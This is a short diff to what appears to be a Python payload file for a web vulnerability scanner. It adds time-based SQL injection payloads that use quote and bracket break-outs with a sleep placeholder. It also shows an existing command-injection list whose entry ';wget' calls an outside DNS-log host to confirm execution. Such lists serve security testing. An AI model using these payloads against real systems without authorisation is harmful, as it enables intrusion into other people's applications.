@@ -4,6 +4,17 @@
 # @Author  : donot (donot@donot.me)
 # @Link    : https://blog.donot.me
 
+SQLiPayload_Sleep = [
+	' and {sleep} --+-',
+    '\' and {sleep} --+-',
+    '" and {sleep} --+-', 
+    "') and {sleep} --+-", 
+    "')) and {sleep} --+-", 
+    '") and {sleep} --+-',
+    '\' && {sleep} #',
+    
+]
+
 
 RCEPayload_DNSLOG = [
 	';wget {randStr}.{DNSLogDomain};',
